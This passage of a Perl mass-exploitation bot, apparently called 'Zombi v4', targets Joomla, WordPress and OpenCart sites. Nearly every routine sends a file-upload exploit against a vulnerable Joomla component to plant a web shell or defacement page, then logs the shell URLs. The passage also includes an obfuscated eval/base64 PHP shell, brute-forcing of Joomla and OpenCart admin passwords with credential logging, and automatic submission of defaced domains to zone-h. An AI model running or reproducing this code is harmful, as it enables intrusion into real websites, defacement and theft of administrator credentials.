print color('bold red'),"False\n";
}
}

################ comfabrik index #####################
sub comfabrikdef(){
my $url = "$site/index.php?option=com_fabrik&c=import&view=import&filetype=csv&table=1";
my $index ="v4hex.txt";
my $field_name = "Filedata[]";

my $response = $ua->post( $url,
            Content_Type => 'form-data',
            Content => ["userfile" => ["$index"], "name" => "me.php", "drop_data" => "1", "overwrite" => "1", "field_delimiter" => ",", "text_delimiter" => "&quot;", "option" => "com_fabrik", "controller" => "import", "view" => "import", "task" => "doimport", "Itemid" => "0", "tableid" => "0"]
           
            );

$comfabrikup="$site/media/v4hex.txt";

$checkcomfabrikup = $ua->get("$comfabrikup")->content;
if($checkcomfabrikup =~/Hacked By Dr HeX Bot/) {
  print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";

print color('bold white'),"Com Fabrik Index";
print color('bold white')," =====HeX=====> ";
print color('bold Yellow'),"VULN\n";
print color('bold white'),"File Uploaded Successfully\n";
print color('bold white'),"  [Get] => $comfabrikup\n";
open (TEXT, '>>Zombi_v4/v4index.txt');
print TEXT "$comfabrikup\n";
close (TEXT);
$def = $comfabrikup;
zoneh();

}else{
  print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";

print color('bold white'),"Com Fabrik Index";
print color('bold white')," =====HeX=====> ";
print color('bold red'),"False\n";
}
}
################ comfabrik2 #####################
sub comfabrik2(){
my $url = "$site/index.php?option=com_fabrik&format=raw&task=plugin.pluginAjax&plugin=fileupload&method=ajax_upload";
my $shell ="v4.php";

my $response = $ua->post( $url,
            Content_Type => 'form-data',
            Content => ["file" => ["$shell"]]
           
            );

$comfabrikupp2="$site/v4.php";

$checkcomfabrikupp = $ua->get("$comfabrikupp2")->content;
if($checkcomfabrikupp =~/Dr HeX Shell/) {
  print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";

print color('bold white'),"Com Fabrik2";
print color('bold white')," +++++++++++++++++++++++ ";
print color('bold Yellow'),"VULN\n";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Get] => $comfabrikupp2\n";
open (TEXT, '>>Zombi_v4/v4shell.txt');
print TEXT "$comfabrikupp\n";
close (TEXT);
}else{
  print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";

print color('bold white'),"Com Fabrik2";
print color('bold white')," +++++++++++++++++++++++ ";
print color('bold red'),"False\n";
}
}

################ comfabrik index2 #####################
sub comfabrikdef2(){
my $url = "$site/index.php?option=com_fabrik&format=raw&task=plugin.pluginAjax&plugin=fileupload&method=ajax_upload";
my $index ="v4hex.txt";

my $response = $ua->post( $url,
            Content_Type => 'form-data',
            Content => ["file" => ["$index"]]
           
            );

$comfabrikup2="$site/v4hex.txt";

$checkcomfabrikup = $ua->get("$comfabrikup2")->content;
if($checkcomfabrikup =~/Hacked By Dr HeX Bot/) {
  print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";

print color('bold white'),"Com Fabrik Index2";
print color('bold white')," +++++++++++++++++ ";
print color('bold Yellow'),"VULN\n";
print color('bold white'),"File Uploaded Successfully\n";
print color('bold white'),"  [Get] => $comfabrikup2\n";
open (TEXT, '>>Zombi_v4/v4index.txt');
print TEXT "$comfabrikup2\n";
close (TEXT);
$def = $comfabrikup2;
zoneh();


}else{
  print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";

print color('bold white'),"Com Fabrik2 Index";
print color('bold white')," +++++++++++++++++ ";
print color('bold red'),"False\n";
}
}


################ comadsmanager #####################
sub comadsmanager(){
my $url = "$site/index.php?option=com_adsmanager&task=upload&tmpl=component";

my $response = $ua->post( $url,
            Cookie => "", Content_Type => "form-data", Content => [file => ["v4def.jpg"], name => "def.html"]
           
            );

$comadsmanagerup="$site/tmp/plupload/def.html";

$checkcomadsmanagerup = $ua->get("$comadsmanagerup")->content;
if($checkcomadsmanagerup =~/Hacked Bot Dr HeX v4/) {
  print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";

print color('bold white'),"Com Ads Manager";
print color('bold white')," +++++++++++++++++++ ";
print color('bold Yellow'),"VULN\n";
print color('bold white'),"File Uploaded Successfully\n";
print color('bold white'),"  [Get] => $comadsmanagerup\n";
open (TEXT, '>>Zombi_v4/v4index.txt');
print TEXT "$comadsmanagerup\n";
close (TEXT);
}else{
  print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";

print color('bold white'),"Com Ads Manager";
print color('bold white')," +++++++++++++++++++ ";
print color('bold red'),"False\n";
}
}

sub comblog(){

my $url = "$site/index.php?option=com_myblog&task=ajaxupload";
my $checkblog = $ua->get("$url")->content;
if($checkblog =~/has been uploaded/) {
print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";
print color('bold white'),"Com Blog";
print color('bold white')," ++++++++++++++++++++++++++ ";
print color('bold Yellow'),"VULN\n";
print color('bold white'),"Exploit It It Manual\n";
    open(save, '>>Zombi_v4/Try_Manulle.txt');   
    print save "[blog] $site\n";   
    close(save);
}else{
  print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";

print color('bold white'),"Com Blog";
print color('bold white')," ++++++++++++++++++++++++++ ";
print color('bold red'),"False\n";
}
}


sub comusers(){

my $url = "$site/index.php?option=com_users&view=registration";
my $checkomusers = $ua->get("$url")->content;
if($checkomusers =~/jform_email2-lbl/) {
  print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";

print color('bold white'),"Com Users";
print color('bold white')," =====HeX=====> ";
print color('bold Yellow'),"VULN\n";
print color('bold white'),"Exploit It Manual\n";
    open(save, '>>Zombi_v4/Try_Manulle.txt');   
    print save "[Com Users] $site\n";   
    close(save);
}else{
  print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";

print color('bold white'),"Com Users";
print color('bold white')," =====HeX=====> ";
print color('bold red'),"False\n";
    }
}


################ mod_simplefileupload #####################
sub mod_simplefileupload(){
    $ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (30);

$url ="$site/modules/mod_simplefileuploadv1.3/elements/udd.php";
$simplefileuploadsup= "$site/modules/mod_simplefileuploadv1.3/elements/v4.php";

my $shell ="v4.php";

my $response = $ua->post( $url, Content_Type => "multipart/form-data", Content => [ file=>["$shell"] , submit=>"Upload" ]);

$check = $ua->get($simplefileuploadsup)->content;
if ($check =~ /Dr HeX Shell/){
  print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";

print color('bold white'),"mod simplefileupload";
print color('bold white')," =====HeX=====> ";
print color('bold Yellow'),"VULN\n";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Get] => $simplefileuploadsup\n\n";
open (TEXT, '>>Zombi_v4/v4shell.txt');
print TEXT "$simplefileuploadsup\n";
close (TEXT);
}else{
  print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";

print color('bold white'),"mod simplefileupload";
print color('bold white')," =====HeX=====> ";
print color('bold red'),"False\n\n";
}
}


####################wp install Checker
sub wpinstallcheck(){

$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (20);
#/wp-admin/setup-config.php
#/wordpress/wp-admin/setup-config.php
#/wp-admin/setup-config.php
  print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";

print color('bold white'),"Checking Wp Install ";
print color('bold white')," =====HeX=====> ";


my $hexxy = $ua->get("$site/wp-admin/setup-config.php")->content;
my $hexxy2 = $ua->get("$site/wordpress/wp-admin/setup-config.php")->content;
my $hexxy3 = $ua->get("$site/wp-admin/setup-config.php")->content;

if($hexxy =~/Setup Configuration File/) {

    print color('bold Yellow');
	    print  "[Found]\n ==> $site/wp-admin/setup-config.php\n";

    open(save, '>>Zombi_v4/wpinstall.txt');
    print save "[Found] ==> $site/wp-admin/setup-config.php/n";
    close(save);
    print color('reset');

}
    elsif ($hexxy2 =~/Setup Configuration File/){
    print color('bold Yellow');
	    print  "[Found]\n ==> $site/wordpress/wp-admin/setup-config.php\n";

	    open(save, '>>Zombi_v4/wpinstall.txt');
    print save "[Found] ==> $site/wordpress/wp-admin/setup-config.php\n";
    close(save);
    print color('reset');

    } elsif ($hexxy3 =~/Setup Configuration File/){
    print color('bold Yellow');
	    print  "[Found]\n ==> $site/wp-admin/setup-config.php\n";

	    open(save, '>>Zombi_v4/wpinstall.txt');
    print save "[Found] ==> $site/wp-admin/setup-config.php\n";
    close(save);
    print color('reset');

    }
else{
print color('bold red'),"False\n\n";
    print color('reset');



        }
	
}
################ com_redmystic #####################
sub redmy(){
my $indexa='<h5>Uploder hex</h5>
<?php eval (gzinflate(base64_decode(str_rot13("ML/EF8ZjRZnsUrk/hVMOJaQZS19pZ3kkVNtX06qEFgnxAct0bH2RGin/zljgT/c2q9
/iih+BI40TaSguWq98TXxc4k0pOiufqT+K7WvibboK8kxCfTyZ6IddrWcAv4mKhyANXlg0FkNPkJ2wTHUTrlQtoJHUjjyFGycunTqKtI8lnvzPLRJ
DT6ZEPUoIKJWkYyewYRFaJxt+epn6S0qs39+umDuTfsEJnSmd3HRWTkCv/WgX54K4g98833KBSUHXv/Ygqsr+k4USOENPRjxM/ZkaAk56eYDM0xJ5
sK552h1khNHKr2lIXpZOhYvSs2VHZh8O8oKbPibYUutxFLYKpCY2KCo8Y7ByDy6D0l8=")))); ?>';

my $url = "$site/administrator/components/com_redmystic/chart/ofc-library/ofc_upload_image.php?name=add.php";
my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
$ua->timeout(10);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");

my $gravityformsres = $ua->post($url, Content_Type => "multipart/form-data", Content => $indexa);

$gravityformsup = "$site/administrator/components/com_redmystic/chart/tmp-upload-images/add.php";
my $checkk = $ua->get("$site/administrator/components/com_redmystic/chart/tmp-upload-images/add.php")->content;
if($checkk =~/Uploder hex/) {
  print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";
print color('bold white'),"com redmystic";
print color('bold white')," =====HeX=====> ";
print color('bold Yellow'),"Done\n";
print color('red')," * ";
print color('reset');
print color('bold white'),"  Shell Uploaded Successfully\n";
print color('bold white'),"    [Get] => $gravityformsup\n";
open (TEXT, '>>Zombi_v4/Shells.txt');
print TEXT "$gravityformsup\n";
close (TEXT);
}
else{
  print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";
print color('bold white'),"com redmystic";
print color('bold white')," =====HeX=====> ";
print color('red'),"False";
print color('bold white'),"\n";
}
}
################################################################
sub rocks(){

my $url = "$site/administrator/components/com_rokdownloads/assets/uploadhandler.php";

my $response = $ua->post($url, Content_Type => 'multipart/form-data',Content => ['Filedata' => ["v4gravity.jpg"], "jpath" => "..%2F..%2F..%2F..%2F" ]);

$sexyup="$site/images/stories/v4gravity.jpg";

$checkpofxwup = $ua->get("$sexyup")->content;
if($checkpofxwup =~/Dr HeX Shell/) {		

  print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";
print color('bold white'),"rokdownloads";
print color('bold white')," +++++++++++++++++++++++ ";
print color('bold Yellow'),"Done\n";
print color('red')," * ";
print color('reset');
print color('bold white'),"  Shell Uploaded Successfully\n";
print color('bold white'),"  [Get] => $uploadfolder\n";
    open(save, '>>Zombi_v4/shell.txt');   
print TEXT "$uploadfolder\n";
close (TEXT);
}else{
  print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";
print color('bold white'),"rokdownloads";
print color('bold white')," +++++++++++++++++++++++ ";
print color('red'),"False\n";
}
}

################################################################
sub sujks(){

my $url = "$site/administrator/components/com_extplorer/uploadhandler.php";
my $shell ="v4gravity.jpg";
my $field_name = "Filedata";

my $response = $ua->post( $url,
            Content_Type => 'multipart/form-data',
            Content => [ $field_name => ["$shell"] ]
           
            );

$sexyup="$site/images/stories/v4gravity.jpg";

$checkpofxwup = $ua->get("$sexyup")->content;
if($checkpofxwup =~/Mister Soy Shell/) {		

  print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";
print color('bold white'),"com extplorer";
print color('bold white')," ++++++++++++++++++++++ ";
print color('bold Yellow'),"Done\n";
print color('red')," * ";
print color('reset');
print color('bold white'),"  shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $uploadfolder\n";
    open(save, '>>Zombi_v4/shell.txt');   
print TEXT "$uploadfolder\n";
close (TEXT);
}else{
  print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";
print color('bold white'),"com extplorer";
print color('bold white')," ++++++++++++++++++++++ ";
print color('red'),"False\n";
}
}
################ com_jwallpapers fileupload #####################
sub facile(){
    $ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (30);

$url ="$site/components/com_facileforms/libraries/jquery/uploadify.php";
$comjwallpapersup= "$site/components/com_facileforms/libraries/jquery/v4.php";

my $shell ="v4.php";

my $response = $ua->post( $url, Content_Type => "multipart/form-data", Content => [ Filedata=>["$shell"] , 'folder'=>'/components/com_facileforms/libraries/jquery/' ]);

$check = $ua->get($comjwallpapersup)->content;
if ($check =~ /Dr HeX Shell/){
  print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";
print color('bold white'),"comfacileforms";
print color('bold white')," +++++++++++++++++ ";
print color('bold Yellow'),"Done\n";
print color('red')," * ";
print color('reset');
print color('bold white'),"  Shell Uploaded Successfully\n";
print color('bold white'),"  [Get] => $comjwallpapersup\n";
open (TEXT, '>>Zombi_v4/shells.txt');
print TEXT "$comjwallpapersup\n";
close (TEXT);
}else{
  print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";
print color('bold white'),"comfacileforms";
print color('bold white')," =====HeX=====> ";
print color('red'),"False\n";
}
}
################ Proclaim 9.1.1 #####################
sub Proclaim(){
my $url = "$site/index.php?option=com_biblestudy&view=mediafileform&layout=edit&id=1";

my $shell ="v4.php";

my $response = $ua->post($url, Content_Type => 'multipart/form-data', content => [ ["$shell"] ]);

$Proclaims="$site/images/biblestudy/media/v4.php";
my $checkfoxup = $ua->get("$Proclaims")->content;
if ($checkfoxup =~ /Dr HeX Shell/) {
  print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";
print color('bold white'),"Com Proclaim";
print color('bold white')," ++++++++++++++++++++++ ";
print color('bold Yellow'),"Done\n";
print color('bold white'),"  Shell Uploaded Successfully\n";
print color('bold white'),"  [Get] => $Proclaims\n";
open (TEXT, '>>Zombi_v4/shells.txt');
print TEXT "$Proclaims\n";
close (TEXT);
}else{
  print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";
print color('bold white'),"Com Proclaim";
print color('bold white')," ++++++++++++++++++++++ ";
print color('red'),"False\n";
}}
################ Jimtawl 2.1.6 #####################
sub Jimtawl(){
my $url = "$site/index.php?option=com_jimtawl&view=upload&task=upload&pop=true&tmpl=component";

my $shell ="v4.php";

my $response = $ua->post($url, Content_Type => 'multipart/form-data', content => [ ["$shell"] ]);

$Jimtawls="$site/media/v4.php";

my $checkfoxup = $ua->get("$Jimtawls")->content;
if ($checkfoxup =~ /Dr HeX Shell/) {
  print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";
print color('bold white'),"Com Jimtawl";
print color('bold white')," +++++++++++++++++++++++ ";
print color('bold Yellow'),"Done\n";
print color('bold white'),"  Shell Uploaded Successfully\n";
print color('bold white'),"  [Get] => $Jimtawls\n";
open (TEXT, '>>Zombi_v4/shells.txt');
print TEXT "$Jimtawls\n";
close (TEXT);
}else{
  print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";
print color('bold white'),"Com Jimtawl";
print color('bold white')," +++++++++++++++++++++++ ";
print color('red'),"False\n";
}}
################ NovaSFH 3.0.2  #####################
sub NovaSFH(){
my $url = "$site/administrator/index.php?option=com_novasfh&c=uploader";

my $shell ="v4.php";

my $response = $ua->post($url, Content_Type => 'multipart/form-data', content => [ ["$shell"] ]);

$NovaSFHs="$site/v4.php";

my $checkfoxup = $ua->get("$NovaSFHs")->content;
if ($checkfoxup =~ /Dr HeX Shell/) {
  print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";
print color('bold white'),"Com NovaSFH";
print color('bold white')," +++++++++++++++++++++++ ";
print color('bold Yellow'),"Done\n";
print color('bold white'),"  Shell Uploaded Successfully\n";
print color('bold white'),"  [Get] => $NovaSFHs\n";
open (TEXT, '>>Zombi_v4/shells.txt');
print TEXT "$NovaSFHs\n";
close (TEXT);
}else{
  print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";
print color('bold white'),"Com NovaSFH";
print color('bold white')," +++++++++++++++++++++++ ";
print color('red'),"False\n";
}}
################ com_collector #####################
sub collector(){
my $url = "$site/index.php?option=com_collector&view=filelist&tmpl=component&folder=&type=1";

my $shell ="v4.php";

my $response = $ua->post($url, Content_Type => 'multipart/form-data', content => [ ["$shell"] ]);

$collectors="$site/v4.php";

my $checkfoxup = $ua->get("$collectors")->content;
if ($checkfoxup =~ /Dr HeX Shell/) {
  print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";
print color('bold white'),"Com collector";
print color('bold white')," =====HeX=====> ";
print color('bold Yellow'),"Done\n";
print color('bold white'),"  Shell Uploaded Successfully\n";
print color('bold white'),"  [Get] => $collectors\n";
open (TEXT, '>>Zombi_v4/shells.txt');
print TEXT "$collectors\n";
close (TEXT);
}else{
  print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";
print color('bold white'),"Com collector";
print color('bold white')," =====HeX=====> ";
print color('red'),"False\n";
}}
################ com_osproperty 2.0.2 #####################
sub osproperty(){
my $url = "$site/osproperty/?task=agent_register";

my $shell ="v4.php";

my $response = $ua->post($url, Content_Type => 'multipart/form-data', content => [ ["$shell"] ]);

$ospropertys="$site/images/osproperty/agent/v4.php";

my $checkfoxup = $ua->get("$ospropertys")->content;
if ($checkfoxup =~ /Dr HeX Shell/) {
  print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";
print color('bold white'),"Com osproperty";
print color('bold white')," ++++++++++++++++++++ ";
print color('bold Yellow'),"Done\n";
print color('bold white'),"  Shell Uploaded Successfully\n";
print color('bold white'),"  [Get] => $ospropertys\n";
open (TEXT, '>>Zombi_v4/shells.txt');
print TEXT "$ospropertys\n";
close (TEXT);
}else{
  print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";
print color('bold white'),"Com osproperty";
print color('bold white')," ++++++++++++++++++++ ";
print color('red'),"False\n";
}}
################ com_ksadvertiser #####################
sub ksadvertiser(){
my $url = "$site/index.php?option=com_ksadvertiser&Itemid=36&task=add&catid=0&lang=en";

my $shell ="v4.php";

my $response = $ua->post($url, Content_Type => 'multipart/form-data', content => [ ["$shell"] ]);

$ksadvertisers="$site/images/ksadvertiser/U0/v4.php";

my $checkfoxup = $ua->get("$ksadvertisers")->content;
if ($checkfoxup =~ /Dr HeX Shell/) {
  print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";
print color('bold white'),"Com ksadvertiser";
print color('bold white')," ++++++++++++++++ ";
print color('bold Yellow'),"Done\n";
print color('bold white'),"  Shell Uploaded Successfully\n";
print color('bold white'),"  [Get] => $ksadvertisers\n";
open (TEXT, '>>Zombi_v4/shells.txt');
print TEXT "$ksadvertisers\n";
close (TEXT);
}else{
  print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";
print color('bold white'),"Com ksadvertiser";
print color('bold white')," =====HeX=====> ";
print color('red'),"False\n";
}}
################ com_hwdvideoshare #####################
sub hwdvideoshare(){
my $url = "$site/com_hwdvideoshare/assets/uploads/flash/flash_upload.php?jqUploader=1";

my $shell ="v4.php";

my $response = $ua->post($url, Content_Type => 'multipart/form-data', content => [ ["$shell"] ]);

$hwdvideoshares="$site/tmp/v4.php";

my $checkfoxup = $ua->get("$hwdvideoshares")->content;
if ($checkfoxup =~ /Dr HeX Shell/) {
  print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";
print color('bold white'),"Com hwdvideoshare";
print color('bold white')," +++++++++++++++++ ";
print color('bold Yellow'),"Done\n";
print color('bold white'),"  Shell Uploaded Successfully\n";
print color('bold white'),"  [Get] => $hwdvideoshares\n";
open (TEXT, '>>Zombi_v4/shells.txt');
print TEXT "$hwdvideoshares\n";
close (TEXT);
}else{
  print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";
print color('bold white'),"Com hwdvideoshare";
print color('bold white')," +++++++++++++++++ ";
print color('red'),"False\n";
}}
################ mod_jfancy #####################
sub fancys(){
my $url = "$site/modules/mod_jfancy/script.php";

my $shell ="v4.php";

my $response = $ua->post($url, Content_Type => 'multipart/form-data', content => [ ["$shell"] ]);

$fancyss="$site/images/v4.php";

my $checkfoxup = $ua->get("$fancyss")->content;
if ($checkfoxup =~ /Dr HeX Shell/) {
  print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";
print color('bold white'),"Com fancys";
print color('bold white')," ++++++++++++++++++++++++ ";
print color('bold Yellow'),"Done\n";
print color('bold white'),"  Shell Uploaded Successfully\n";
print color('bold white'),"  [Get] => $fancyss\n";
open (TEXT, '>>Zombi_v4/shells.txt');
print TEXT "$fancyss\n";
close (TEXT);
}else{
  print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";
print color('bold white'),"Com fancys";
print color('bold white')," ++++++++++++++++++++++++ ";
print color('red'),"False\n";
}}
################ mod_artuploader #####################
sub artuploader(){
my $url = "$site/modules/mod_artuploader/upload.php";

my $shell ="v4.php";

my $response = $ua->post($url, Content_Type => 'multipart/form-data', content => [ ["$shell"] ]);

$artuploaders="$site/modules/mod_artuploader/v4.php";

my $checkfoxup = $ua->get("$artuploaders")->content;
if ($checkfoxup =~ /Dr HeX Shell/) {
  print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";
print color('bold white'),"Com artuploader";
print color('bold white')," +++++++++++++++++++ ";
print color('bold Yellow'),"Done\n";
print color('bold white'),"  Shell Uploaded Successfully\n";
print color('bold white'),"  [Get] => $artuploaders\n";
open (TEXT, '>>Zombi_v4/shells.txt');
print TEXT "$artuploaders\n";
close (TEXT);
}else{
  print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";
print color('bold white'),"Com artuploader";
print color('bold white')," +++++++++++++++++++ ";
print color('red'),"False\n";
}}
################joomla brute#######################################3
sub joomlabrute(){
  print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";
print color('bold white'),"Start brute force";
print color('bold white')," +++++++++++++++++ ";
print color('red'),"Wait\n";
$joomsite = $site . '/administrator/index.php';

$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (30);
$ua->cookie_jar(
        HTTP::Cookies->new(
            file => 'mycookies.txt',
            autosave => 1
        )
    );


$getoken = $ua->get($joomsite)->content;
if ( $getoken =~ /name="(.*)" value="1"/ ) {
$token = $1 ;
}else{
print "  Can't Grabb Joomla Token !\n";
next OUTER;
}


@patsj=('123456','123456789','admin123','demo','admin123123','admin123321','12345','112233','Admin','admin123456','123','1234','admin','password','root');
foreach $pmasj(@patsj){
chomp $pmasj;
$joomuser = admin;
$joompass = $pmasj;
print color('red'),"  Trying: $joompass";
print " \n";
$joomlabrute = POST $joomsite, [username => $joomuser, passwd => $joompass, lang =>en-GB, option => user_login, task => login, $token => 1];
$response = $ua->request($joomlabrute);

my $check = $ua->get("$joomsite")->content;
if ($check =~ /logout/){
print "- ";
print color('bold Yellow'),"Done\n";
print color('reset');
open (TEXT, '>>Zombi_v4/joompassword.txt');
print TEXT "$joomsite => User: $joomuser Pass: $joompass\n";
close (TEXT);
next OUTER;
}
}
}
###### OpenCart #######
sub opencart{
  print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";
print color('bold white'),"Starting brute force\n";
open(a,"v4passopen.txt") or die "$!";
while(<a>){
chomp($_);
$ocuser = admin;
$ocpass = $_;
print color('bold red')," [";
print color('bold Yellow'),"+";
print color('bold white'),"] ";
print color('bold white'),"Trying: $ocpass \n";
$OpenCart= $site . '/admin/index.php';

$ocbrute = POST $OpenCart, [username => $ocuser, password => $ocpass,];
$response = $ua->request($ocbrute);
$stat = $response->status_line;
if ($stat =~ /302/){
print color('bold Yellow'),"Sucess == > \n $OpenCart User : admin Pass : $ocpass \n";
print color('reset');
open (TEXT, '>>Zombi_v4/BruteOpen.txt');
print TEXT "$OpenCart => User: $ocuser Pass: $ocpass\n";
close (TEXT);
}
}
}

sub zoneh(){
print color('bold white'),"[";
print color('bold Yellow'),"+";
print color('bold white'),"] ";
print color('bold white'),"Zone-h Poster +++++++++++++++++++++ ";

    open(save, '>>Zombi_v4/v4index.txt');
    print save "$def\n";
    close(save);

  $hack="BADEXAMPLE";
  $zn="http://zone-h.org/notify/singles";
  $lwp=LWP::UserAgent->new;
  $res=$lwp  -> post($zn,[
  'defacer'=> $hack,
  'domain1'   => $def,
  'hackmode' => '15',
  'reason'  => '1',
  'submit'  => 'Send',
  ]);
  if ($res->content =~ /color="red">ERROR<\/font><\/li>/) {
   print color('bold red');
print "False\n";
    print color('reset');

  }
  elsif ($res->content =~ /color="red">OK<\/font><\/li>/) {
   print color('bold Yellow');
print "[True Success]\n";
    print color('reset');



  }
  else
  {
   print color('bold red');
print "False\n";
    print color('reset');
  }
   }
